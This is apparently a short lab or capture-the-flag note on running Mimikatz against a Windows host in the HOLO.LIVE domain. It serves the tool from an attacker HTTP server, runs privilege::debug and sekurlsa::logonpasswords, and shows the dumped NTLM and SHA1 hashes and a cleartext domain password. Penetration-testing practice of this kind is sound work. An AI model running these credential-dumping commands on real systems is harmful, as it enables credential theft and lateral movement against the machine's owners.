
Let's run Mimikatz
```
http://10.51.9.13/mimikatz/x64/
```

```
python3 -m http.server 80
```

https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz

```
privilege::debug
```

```
sekurlsa::logonpasswords
```

```
Username : S-SRV01$
NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
HA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
```

```
Username : watamet
NTLM     : d8d41e6cf762a8c77776a1843d4141c9
SHA1     : 7701207008976fdd6c6be9991574e2480853312d
DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0

Username : watamet
Domain   : HOLO.LIVE
Password : Nothingtoworry!
```


![[Pasted image 20240830041056.png]]

